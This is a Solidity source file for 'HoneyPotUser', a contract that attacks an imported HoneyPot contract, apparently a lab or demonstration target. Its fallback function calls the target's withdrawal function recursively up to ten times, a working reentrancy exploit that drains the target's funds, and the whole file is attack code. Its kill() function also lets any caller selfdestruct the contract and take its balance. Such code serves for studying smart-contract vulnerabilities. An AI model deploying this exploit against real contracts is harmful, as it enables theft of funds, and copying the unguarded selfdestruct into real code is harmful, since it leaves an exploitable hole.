pragma solidity ^0.5.8;
import "./HoneyPot.sol";

contract HoneyPotUser{
    HoneyPot public honeyPot;
    uint counter;
    event LogFallBack(uint c, uint balance);
    constructor(address _hPotCollect) public{
        honeyPot = HoneyPot(_hPotCollect);
    }
    function kill() public {
        selfdestruct(msg.sender);
    }
    function put() public payable{
        honeyPot.put.value(msg.value)();
    }
    function get() public{
        honeyPot.get();
    }
    function getBalance() public view  returns(uint256) {
         return(address(this).balance);
    }
    function() external payable{
        counter++;
        emit LogFallBack(counter, msg.value);
        if(counter<10){
            honeyPot.get();
        }
    }
    function getCounter() public view returns(uint){
        return counter;
    }
}